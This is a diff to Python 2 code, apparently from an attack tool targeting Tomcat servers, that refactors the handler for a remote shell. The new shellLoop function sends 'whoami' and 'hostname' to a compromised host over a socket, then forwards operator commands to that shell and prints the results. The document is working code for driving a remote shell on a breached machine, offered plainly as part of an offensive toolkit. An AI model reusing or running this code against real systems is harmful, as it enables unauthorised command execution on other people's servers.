@@ -62,6 +62,49 @@ logging.addLevelName( logging.ERROR, "\033[1;41m%s\033[1;0m" % logging.getLevelN
 logger = logging.getLogger()
 
 
+def shellLoop(sock):
+
+    try:
+        sock.send('whoami\n')
+        whoami = sock.recv(RECVSIZE).strip()
+        sock.send('hostname\n')
+        hostname = sock.recv(RECVSIZE).strip()
+    except (socket.gaierror, socket.error) as e:
+        logger.error("Initial commands could not be executed. Something is wrong.\n\tError: '%s'" % e)
+        return False
+
+    logger.debug('Connected with the shell: %s@%s' % (whoami, hostname))
+    sock.settimeout(0)
+    sock.setblocking(1)
+    SHELLSTATUS.set()
+
+    if len(whoami) == 0:
+        whoami = 'tomcat'
+    if len(hostname) == 0:
+        hostname = host
+
+    try:
+        while True:
+            command = raw_input("\n%s@%s $ " % (whoami, hostname))
+            if not command: continue
+            if command.lower() == 'exit' or command.lower() == 'quit':
+                break
+
+            sock.send(command + '\n')
+            res = sock.recv(RECVSIZE).strip()
+
+            if not len(res) and len(command):
+                if serv: serv.close()
+                break
+
+            print res
+
+    except KeyboardInterrupt:
+        SHELLSTATUS.clear()
+        # Pass it down to the main function's except block.
+        raise KeyboardInterrupt
+
+
 def shellHandler(mode, hostn, opts):
     logger.debug('Spawned shell handling thread. Awaiting for the event...')
     time.sleep(int(opts.timeout) / 10)
@@ -99,49 +142,10 @@ def shellHandler(mode, hostn, opts):
             sock.close()
             return False
     
-    try:
-        sock.send('whoami\n')
-        whoami = sock.recv(RECVSIZE).strip()
-        sock.send('hostname\n')
-        hostname = sock.recv(RECVSIZE).strip()
-    except (socket.gaierror, socket.error) as e:
-        logger.error("Initial commands could not be executed. Something is wrong.\n\tError: '%s'" % e)
-        return False
-
-    logger.debug('Connected with the shell: %s@%s' % (whoami, hostname))
-    sock.settimeout(0)
-    sock.setblocking(1)
-    SHELLSTATUS.set()
-
-    if len(whoami) == 0:
-        whoami = 'tomcat'
-    if len(hostname) == 0:
-        hostname = host
-
-    try:
-        while True:
-            command = raw_input("\n%s@%s $ " % (whoami, hostname))
-            if not command: continue
-            if command.lower() == 'exit' or command.lower() == 'quit':
-                sock.close()
-                if serv: serv.close()
-                break
-
-            sock.send(command + '\n')
-            res = sock.recv(RECVSIZE).strip()
-
-            if not len(res) and len(command):
-                sock.close()
-                if serv: serv.close()
-                break
-
-            print res
-
-    except KeyboardInterrupt:
-        sock.shutdown(0)
-        SHELLSTATUS.clear()
-        # Pass it down to the main function's except block.
-        raise KeyboardInterrupt
+    shellLoop(sock)
+    sock.close()
+    if serv: 
+        serv.close()
 
     SHELLSTATUS.clear()
     return True
